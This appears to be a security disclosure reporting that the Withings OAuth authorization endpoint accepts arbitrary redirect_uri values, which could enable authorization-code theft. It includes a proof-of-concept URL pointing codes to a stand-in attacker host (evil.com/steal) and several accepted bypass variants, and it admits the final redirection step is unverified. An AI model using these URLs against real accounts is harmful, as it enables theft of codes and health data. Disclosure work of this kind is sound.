# OAuth redirect_uri Bypass - Account Takeover Chain
## Severity: HIGH (Potential Critical with full chain)

### Summary
The Withings OAuth 2.0 authorization endpoint accepts ANY redirect_uri without validation, potentially allowing an attacker to steal authorization codes and achieve account takeover.

### PoC
1. Attacker constructs OAuth URL with malicious redirect_uri:
```
https://account.withings.com/oauth2_user/authorize2?
  response_type=code&
  client_id=655894465677-2lq45fkgtl2g0n95nm4g34qunf362ec5.apps.googleusercontent.com&
  redirect_uri=https://evil.com/steal&
  scope=user.info
```

2. Server responds with 302 redirect, ACCEPTING the evil.com redirect_uri:
```
HTTP/1.1 302 Found
location: /oauth2_user/login?response_type=code&client_id=655894465677-...&redirect_uri=https%3A%2F%2Fevil.com%2Fsteal&scope=user.info&b=authorize2
```

3. The redirect_uri is stored in cookies:
```
set-cookie: current_path_login=%3Fr%3D...%26redirect%3Dhttps%3A%2F%2Fevil.com
set-cookie: url_params=%3Fr%3D...%26redirect%3Dhttps%3A%2F%2Fevil.com
```

4. After user login, the authorization code may be redirected to evil.com

### Tested Variations (All Accepted)
- `https://evil.com/steal` ✅ Accepted
- `https://evil.withings.com/callback` ✅ Accepted  
- `https://withings.com/@evil` ✅ Accepted

### Impact
- Authorization code theft
- Potential account takeover if code is valid
- Access to health data (weight, heart rate, sleep, BP)

### CVSS 3.1
AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N = 8.1 (High)

### Note
Requires valid user account to complete the flow. Need to verify if the code is actually redirected to the attacker's domain after login.
